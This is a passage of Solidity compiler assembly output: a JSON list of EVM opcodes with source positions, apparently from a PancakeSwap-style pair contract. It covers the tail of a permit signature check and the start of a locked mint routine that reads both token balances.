											"begin": 4280,
											"end": 4310,
											"name": "DUP1"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "ISZERO"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "SWAP1"
										},
										{
											"begin": 4280,
											"end": 4339,
											"name": "PUSH [tag]",
											"value": "282"
										},
										{
											"begin": 4280,
											"end": 4339,
											"name": "JUMPI"
										},
										{
											"begin": 4280,
											"end": 4339,
											"name": "POP"
										},
										{
											"begin": 4334,
											"end": 4339,
											"name": "DUP9"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4314,
											"end": 4339,
											"name": "AND"
										},
										{
											"begin": 4314,
											"end": 4330,
											"name": "DUP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4314,
											"end": 4339,
											"name": "AND"
										},
										{
											"begin": 4314,
											"end": 4339,
											"name": "EQ"
										},
										{
											"begin": 4280,
											"end": 4339,
											"name": "tag",
											"value": "282"
										},
										{
											"begin": 4280,
											"end": 4339,
											"name": "JUMPDEST"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH [tag]",
											"value": "283"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "JUMPI"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP1"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP2"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MSTORE"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP3"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "ADD"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MSTORE"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "1A"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP3"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "ADD"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MSTORE"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "50616E63616B653A20494E56414C49445F5349474E4154555245000000000000"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP3"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "ADD"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MSTORE"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "SWAP1"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MLOAD"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "SWAP1"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP2"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "SWAP1"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "SUB"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "ADD"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "SWAP1"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "REVERT"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "tag",
											"value": "283"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "JUMPDEST"
										},
										{
											"begin": 4401,
											"end": 4432,
											"name": "PUSH [tag]",
											"value": "284"
										},
										{
											"begin": 4410,
											"end": 4415,
											"name": "DUP10"
										},
										{
											"begin": 4417,
											"end": 4424,
											"name": "DUP10"
										},
										{
											"begin": 4426,
											"end": 4431,
											"name": "DUP10"
										},
										{
											"begin": 4401,
											"end": 4409,
											"name": "PUSH [tag]",
											"value": "190"
										},
										{
											"begin": 4401,
											"end": 4432,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4401,
											"end": 4432,
											"name": "tag",
											"value": "284"
										},
										{
											"begin": 4401,
											"end": 4432,
											"name": "JUMPDEST"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 6635,
											"end": 7916,
											"name": "tag",
											"value": "127"
										},
										{
											"begin": 6635,
											"end": 7916,
											"name": "JUMPDEST"
										},
										{
											"begin": 6688,
											"end": 6702,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1205,
											"end": 1213,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 1205,
											"end": 1213,
											"name": "SLOAD"
										},
										{
											"begin": 1217,
											"end": 1218,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1205,
											"end": 1218,
											"name": "EQ"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH [tag]",
											"value": "286"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "JUMPI"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP2"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP3"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP3"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E881313D0D2D151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "8A"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP3"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MLOAD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP2"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SUB"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "REVERT"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "tag",
											"value": "286"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "JUMPDEST"
										},
										{
											"begin": 1259,
											"end": 1260,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1248,
											"end": 1256,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 1248,
											"end": 1260,
											"name": "DUP2"
										},
										{
											"begin": 1248,
											"end": 1260,
											"name": "SWAP1"
										},
										{
											"begin": 1248,
											"end": 1260,
											"name": "SSTORE"
										},
										{
											"begin": 1259,
											"end": 1260,
											"name": "DUP1"
										},
										{
											"begin": 6757,
											"end": 6770,
											"name": "PUSH [tag]",
											"value": "288"
										},
										{
											"begin": 6757,
											"end": 6768,
											"name": "PUSH [tag]",
											"value": "56"
										},
										{
											"begin": 6757,
											"end": 6770,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6757,
											"end": 6770,
											"name": "tag",
											"value": "288"
										},
										{
											"begin": 6757,
											"end": 6770,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6818,
											"end": 6824,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 6818,
											"end": 6824,
											"name": "SLOAD"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "DUP1"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "DUP2"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "MSTORE"
										},
										{
											"begin": 6844,
											"end": 6848,
											"name": "ADDRESS"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "DUP3"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "ADD"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "MSTORE"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "SWAP1"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "MLOAD"
										},
										{
											"begin": 6714,
											"end": 6770,
											"name": "SWAP4"
										},
										{
											"begin": 6714,
											"end": 6770,
											"name": "SWAP6"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6714,
											"end": 6770,
											"name": "SWAP2"
										},
										{
											"begin": 6714,
											"end": 6770,
											"name": "SWAP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6795,
											"end": 6808,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 6795,
											"end": 6808,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 6818,
											"end": 6824,
											"name": "SWAP1"
										},
										{
											"begin": 6818,
											"end": 6824,
											"name": "SWAP2"
										},
										{
											"begin": 6818,
											"end": 6824,
											"name": "AND"
										},
										{
											"begin": 6818,
											"end": 6824,
											"name": "SWAP2"
										},
										{
											"begin": 6811,
											"end": 6835,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 6811,
											"end": 6835,
											"name": "SWAP2"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "DUP1"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "DUP4"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "ADD"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "SWAP3"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "SWAP3"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "SWAP2"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "SWAP1"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "DUP3"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "SWAP1"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "SUB"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "ADD"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "DUP2"
										},
										{
											"begin": 6818,
											"end": 6824,
											"name": "DUP7"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "DUP1"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "289"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "289"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "POP"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "GAS"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "STATICCALL"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "290"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "290"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "POP"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "POP"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "POP"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "POP"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "MLOAD"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "291"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "291"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "MLOAD"
										},
										{
											"begin": 6883,
											"end": 6889,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 6883,
											"end": 6889,
											"name": "SLOAD"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "DUP1"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "DUP2"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "MSTORE"
										},
										{
											"begin": 6909,
											"end": 6913,
											"name": "ADDRESS"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "DUP3"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "ADD"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "MSTORE"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "SWAP1"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "MLOAD"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "SWAP3"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "SWAP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6860,
											"end": 6873,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 6860,
											"end": 6873,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 6883,
											"end": 6889,
											"name": "SWAP1"
										},
										{
											"begin": 6883,
											"end": 6889,
											"name": "SWAP3"
										},
										{
											"begin": 6883,
											"end": 6889,
											"name": "AND"
										},
										{
											"begin": 6883,
											"end": 6889,
											"name": "SWAP2"
										},
										{
											"begin": 6876,
											"end": 6900,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 6876,
											"end": 6900,
											"name": "SWAP2"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "DUP1"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "DUP3"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "ADD"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "SWAP3"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 6811,
											"end": 6850,
											"name": "SWAP3"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "SWAP1"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "SWAP2"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "SWAP1"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "DUP3"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "SWAP1"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "SUB"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "ADD"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "DUP2"
										},
										{
											"begin": 6883,
											"end": 6889,
											"name": "DUP7"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "DUP1"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "292"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "292"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "POP"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "GAS"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "STATICCALL"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "293"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "293"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "POP"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "POP"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "POP"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "POP"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "MLOAD"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "294"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "294"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "MLOAD"
										},
										{
											"begin": 6876,
											"end": 6915,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6925,
											"end": 6937,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 6940,
											"end": 6963,
											"name": "PUSH [tag]",
											"value": "295"
										},
										{
											"begin": 6940,
											"end": 6948,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 6940,
											"end": 6963,
											"name": "DUP8"
										},
										{
											"begin": 6940,
											"end": 6963,
											"name": "AND"
										},
										{
											"begin": 6940,
											"end": 6963,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 6940,
											"end": 6952,
											"name": "PUSH [tag]",
											"value": "177"
										},
										{
											"begin": 6940,
											"end": 6963,
											"name": "AND"
										},
										{
											"begin": 6940,
											"end": 6963,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6940,
											"end": 6963,
											"name": "tag",
											"value": "295"
										},
										{
											"begin": 6940,
											"end": 6963,
											"name": "JUMPDEST"
										},
										{
											"begin": 6925,
											"end": 6963,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6973,
											"end": 6985,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 6988,
											"end": 7011,
											"name": "PUSH [tag]",
											"value": "296"
										},
										{
											"begin": 6988,
											"end": 6996,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 6988,
											"end": 7011,
											"name": "DUP8"
										},
										{
											"begin": 6988,
											"end": 7011,
											"name": "AND"
										},
										{
											"begin": 6988,
											"end": 7011,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 6988,
											"end": 7000,
											"name": "PUSH [tag]",
											"value": "177"
										},
										{
											"begin": 6988,
											"end": 7011,
											"name": "AND"
										},
										{
											"begin": 6988,
											"end": 7011,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6988,
											"end": 7011,
											"name": "tag",
											"value": "296"
										},
										{
											"begin": 6988,
											"end": 7011,
											"name": "JUMPDEST"
										},
										{
											"begin": 6973,
											"end": 7011,
											"name": "SWAP1"
										},
										{
											"begin": 6973,
											"end": 7011,
											"name": "POP"
										},
										{
											"begin": 7022,
											"end": 7032,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 7035,
											"end": 7065,
											"name": "PUSH [tag]",
											"value": "297"
										},
										{
											"begin": 7044,
											"end": 7053,
											"name": "DUP8"
										},
										{
											"begin": 7055,
											"end": 7064,
											"name": "DUP8"
										},
										{
											"begin": 7035,
											"end": 7043,
											"name": "PUSH [tag]",
											"value": "214"
										},
										{
											"begin": 7035,
											"end": 7065,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 7035,
											"end": 7065,
											"name": "tag",
											"value": "297"
										},
										{
											"begin": 7035,
											"end": 7065,
											"name": "JUMPDEST"
										},
										{
											"begin": 7075,
											"end": 7092,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 7095,
											"end": 7106,
											"name": "SLOAD"
										},
										{
											"begin": 7022,
											"end": 7065,
											"name": "SWAP1"
										},
										{
											"begin": 7022,
											"end": 7065,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 7198,
											"end": 7215,
											"name": "DUP1"
										},
										{
											"begin": 7194,
											"end": 7593,
											"name": "PUSH [tag]",
											"value": "298"
										},
										{
											"begin": 7194,
											"end": 7593,
											"name": "JUMPI"
										},
										{
											"begin": 7243,
											"end": 7297,
											"name": "PUSH [tag]",
											"value": "299"
										},
										{
											"begin": 443,
											"end": 450,
